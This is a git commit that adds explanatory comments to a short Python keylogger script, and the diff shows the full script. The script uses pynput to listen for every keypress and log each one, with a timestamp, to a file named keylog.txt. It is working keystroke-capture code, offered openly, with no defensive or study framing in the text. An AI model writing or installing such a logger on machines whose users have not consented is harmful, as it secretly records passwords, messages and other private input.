d1254c262d653319be978ea0c673dab92e753c0a
Grimmjow <yasarullah5678@gmail.com>
2025-02-05 10:06:13 +0530

    Update keylogger.py

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,17 +1,20 @@
 from pynput.keyboard import Listener
 import logging
 
+#log pressed keys in keylog.txt
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 def on_press(key):
     try:
+        #for regular keys
         logging.info(f"Key {key.char}")
     except AttributeError:
+        #for special keys
         logging.info(f"Special key {key}")
-
+#start keylogger
 def start_keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
-
+#main
 if __name__ == "__main__":
     start_keylogger()
